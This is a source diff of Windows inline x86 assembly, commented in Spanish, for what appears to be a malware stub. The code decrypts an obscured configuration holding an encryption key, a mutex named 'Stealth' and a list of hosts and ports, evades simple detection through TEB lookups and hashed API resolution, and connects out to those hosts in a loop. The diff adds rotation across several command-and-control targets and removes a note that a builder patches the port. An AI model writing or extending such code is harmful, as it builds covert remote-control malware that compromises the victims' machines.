@@ -10,7 +10,7 @@
 //ya que las usamos para mejorar la legibilidad del código
 #pragma warning(disable:4102)
 //No queremos el warning de EMMS, sabemos que estamos haciendo.
-#pragma warning(disable: 4799)
+#pragma warning(disable:4799)
 
 #include <Windows.h>
 #include "macros.h"
@@ -109,6 +109,8 @@ advapi32_symbol_hashes:
         VAR_DEFINE(APPDATA)
         VAR_DEFINE(DAT_NFO)
         VAR_DEFINE(pHOST)
+        VAR_DEFINE(TARGETS)
+        VAR_DEFINE(PORT)
         VAR_DEFINE(pKEY)
         VAR_DEFINE(pMUTEX)
         VAR_DEFINE(hProv)
@@ -133,6 +135,26 @@ copy_next:
         inc esi                         //Saltamos el nulo
         jmp copy_next                   //Siguiente carácter
 copy_done:
+        ret
+        /*###############################################################################
+        ** Subrutina que carga el siguiente Target de la estructura
+        *###############################################################################*/
+load_next_target:
+        mov  edi, [ebp+_pHOST]          //ESI = &HOSTn
+        xor  eax, eax                   //EAX = 0
+        push 0x7F                       //v
+        pop  ecx                        //> ECX = 0x7F
+        repne scasb                     // Buscamos el final de la cadena
+        mov  esi, edi                   //ESI = EDI
+        lodsd                           //EAX = PORT(n+1); ESI = &HOST(n+1)
+        mov  [ebp+_PORT], eax           //
+        mov  [ebp+_pHOST], esi          //
+        test eax, eax                   //Comprobamos si es el último target
+        jnz  get_out                    //Si no es el último devolvemos
+        mov  ecx, [ebp+_TARGETS]        //v
+        dec  ecx                        //>ECX-- para forzar a leer el primer target
+        mov  [ebp+_pHOST], ecx          //> De ser el último apuntamos al inicio y devolvemos 0 en EAX
+get_out:
         ret
 
 #ifdef ERR_CHECK
@@ -180,12 +202,18 @@ KEY:   	//typedef struct aes128Blob{
             /*keydata[16]*/     //EMIT_BYTE_ARRAY((0x63) (0x08) (0x5B) (0x66) (0xDB) (0xD6) (0x33) (0x31) (0xF3) (0x80) (0xD9) (0x75) (0x59) (0xEC) (0x38) (0x04))	
             //SHA1("karcrack:1234")
         //}
-MUTEX:  //EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
-HOST:   //EMIT_BYTE_ARRAY(('1') ('9') ('2') ('.') ('1') ('6') ('8') ('.') ('0') ('.') ('6') ('6')(0))
-        EMIT_BYTE_ARRAY((0x9C) (0x57) (0xFF) (0xFF) (0xC6) (0x17) (0x72) (0xB1) (0xC0) (0x0D) (0xA7) (0xD1) (0xC6) (0x25) (0x45) (0x9F) (0xF5) (0x95) (0xF7) (0xD5) (0xA4) (0x63) (0x17) (0xD0) (0x77) (0xAF) (0xFC) (0xE0) (0x04) (0x97) (0xAB) (0xC4) (0xBC) (0x79) (0xCF) (0xD1) (0x94) (0x1F) (0x29) (0xD7) (0xA4) (0x7B) (0xCF) (0xD1) (0xF9) (0x71) (0x72) (0xB1))
-
-#define CONFIG_SIZE 52
-#define PACKET_CONFIG_COUNT CONFIG_SIZE/8
+        /*
+MUTEX:  EMIT_BYTE_ARRAY(('S') ('t') ('e') ('a') ('l') ('t') ('h')(0))
+HOSTS:  
+PORT1:  EMIT_DWORD(0x932B0002)
+HOST1:  EMIT_BYTE_ARRAY(('1') ('2') ('7') ('.') ('0') ('.') ('0') ('.') ('1')(0))
+PORT2:  EMIT_DWORD(0x932B0002)
+HOST2:  EMIT_BYTE_ARRAY(('l') ('o') ('c') ('a') ('l') ('h') ('o') ('s') ('t')(0))
+        EMIT_DWORD(0)
+        EMIT_DWORD(0)
+        */
+        EMIT_BYTE_ARRAY((0xA4)(0x7B)(0xCF)(0xD1)(0xF9)(0x71)(0x72)(0xB1)(0xBC)(0x79)(0xCF)(0xD1)(0x94)(0x1F)(0x29)(0xD7)(0x77)(0xAF)(0xFC)(0xE0)(0x4)(0x97)(0xAB)(0xC4)(0xF5)(0x95)(0xF7)(0xD5)(0xA4)(0x63)(0x17)(0xD0)(0xC0)(0xD)(0xA7)(0xD1)(0xF5)(0x17)(0x59)(0x22)(0x9D)(0x4B)(0xF8)(0xFF)(0xC7)(0x39)(0x42)(0x9F)(0x9D)(0x79)(0xCD)(0xD1)(0xDC)(0x84)(0x1E)(0xDE)(0xCF)(0x18)(0xA3)(0xB9)(0x98)(0x64)(0x6)(0xB1)(0xAC)(0x79)(0xCF)(0xD1)(0xF7)(0x17)(0x72)(0xB1))
+#define CONFIG_SIZE 128
 config_end:
 #pragma endregion
     __asm{
@@ -310,25 +338,28 @@ find_kernel32_finished:
         call CreateBuff                 //>CreateBuff(CONFIG_SIZE);
 
         mov  edx, eax                   //EDX = &Buffer
-
+        xor  edi, edi                   //EDI = 0
 #pragma region DECRYPT_CONFIG
-        push PACKET_CONFIG_COUNT        //v
-        pop  ecx                        //>ECX = i = Cantidad de bloques de 8 en config
+        xor  ecx, ecx                   //ECX = 0
 xornext:
-        lea  ebx, [esi+(ecx*8)-8]       //EBX = &(QWORD)config_start[i]
+        lea  ebx, [esi+(ecx*8)]         //EBX = &(QWORD)config_start[i]
         movq mm0, QWORD PTR[ebx]        //MM0 = (QWORD)*EBX
         pxor mm0, mm7                   //MM0^= MM7
         movq QWORD PTR[edx], mm0        //*(QWORD)Buffer = MM0
         add  edx, 8                     //Buffer+=8
-        loop xornext                    //i-=1
+        inc  ecx                        //Siguiente bloque
+        cmp  DWORD PTR[edx-4], edi      //Comprobamos si tenemos un DWORD 0 final
+        jnz  xornext                    //Si no es el bloque final pasamos al siguiente
 #pragma endregion
 
         //Guardamos los punteros a los valores descifrados
-        mov  [ebp+_pKEY], eax
-        lea  ebx, [eax+0x1C]
-        mov  [ebp+_pMUTEX], ebx
-        add  ebx, 0x8
-        mov  [ebp+_pHOST], ebx
+        mov  [ebp+_pKEY], eax           //
+        lea  esi, [eax+0x1C]            //ESI = &mutex
+        mov  [ebp+_pMUTEX], esi         //
+        add  esi, 0x8                   //ESI = &Targets
+        mov  [ebp+_TARGETS], esi        //
+        dec  esi                        //ESI-=1 (Hacemos esto para que load_next_target empiece en el target 0)
+        mov  [ebp+_pHOST], esi          //
 
         /*###############################################################################
         **                          Comprobación del Mutex
@@ -338,10 +369,9 @@ xornext:
         push edx                        //v
         push edx                        //v
         call [ebp+_CreateMutexA]        //>CreateMutexA(NULL, False, &MUTEX)
-        push 0x18                       //v
+        push 0x34                       //v
         pop  esi                        //v
-        lods DWORD PTR FS:[esi]         //>EAX = &(TEB)
-        mov  eax, [eax+0x34]            //>GetLastError()
+        lods DWORD PTR FS:[esi]         //>EAX = GetLastError()
 #ifdef ERR_CHECK
         xor  al, 0xB7
         push ERR_MTX
@@ -510,8 +540,11 @@ newSocket:
 
         jmp  connect_loop
 sleep_and_loop:
-        cmp  DWORD PTR[ebp+_DAT_NFO], -1
-        je   do_the_loop                //Si el fichero offline no existe seguimos intentado conectar
+        call load_next_target           //> Cargamos el primer target
+        test eax, eax                   //v
+        jne  do_the_loop                //>Si hemos recorrido ya todos los targets veamos si tenemos version offline
+        cmp  DWORD PTR[ebp+_DAT_NFO], -1//v
+        je   do_the_loop                //>Si el fichero offline no existe seguimos intentado conectar
         //Apuntamos al inicio del fichero
         xor  edx, edx                   //EDX = 0
         push edx                        //v(FILE_BEGIN = 0)
@@ -554,10 +587,9 @@ connect_loop:
         push eax                        //v
         call [ebp+_inet_addr]           //>inet_addr(hostent.h_name);
 
-#define PORT 0x932B0002
         //Construimos la sockaddr_in en la pila
         push eax                        //push IP
-        pushc(PORT)                     //push PORT            (TO DO:<<<< EL BUILDER PARCHEARÁ ESTO!!!! :D)
+        push [ebp+_PORT]                //push PORT
         mov  ebx, esp                   //EBX = &sockaddr_in
 
         push 0x10                       //v size(sockaddr_in)
